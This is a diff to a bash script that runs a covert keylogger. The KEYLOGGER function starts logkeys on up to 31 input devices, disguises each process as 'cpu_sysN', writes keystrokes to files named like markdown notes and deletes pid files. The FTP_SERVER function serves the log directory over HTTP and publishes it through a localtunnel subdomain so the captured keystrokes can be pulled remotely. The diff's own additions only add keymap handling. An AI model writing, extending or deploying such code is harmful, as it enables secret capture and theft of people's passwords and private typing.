@@ -72,11 +72,13 @@ fi
 KEYLOGGER() {
     echo "Starting keylogger.."
     cd ${INSTALL_DIR}
+    sudo logkeys --export-keymap en_US.keymap
     for i in $(seq 1 31); do
         PROC_NAME="cpu_sys${i}"
         OUTPUT_FILE="core_sys${i}.md"
         EVENT_NAME="event${i}"
-        COMMAND="logkeys -s -d ${EVENT_NAME} --output ${OUTPUT_FILE}"
+
+        COMMAND="logkeys -s -d ${EVENT_NAME} --output ${OUTPUT_FILE} --keymap en_US.keymap"
         rm -rf /var/run/logkeys.pid
         bash -c "exec -a ${PROC_NAME} ${COMMAND} &"
         rm -rf /var/run/logkeys.pid
@@ -89,6 +91,7 @@ FTP_SERVER() {
     cd ${INSTALL_DIR}
     cmd1="python3 -m http.server 31"
     eval "${cmd1}" &>/dev/null & disown;
+
     cmd2="lt --local-host 0.0.0.0 --port 31 --subdomain logger812432"
     eval "${cmd2}" &>/dev/null & disown;
 }
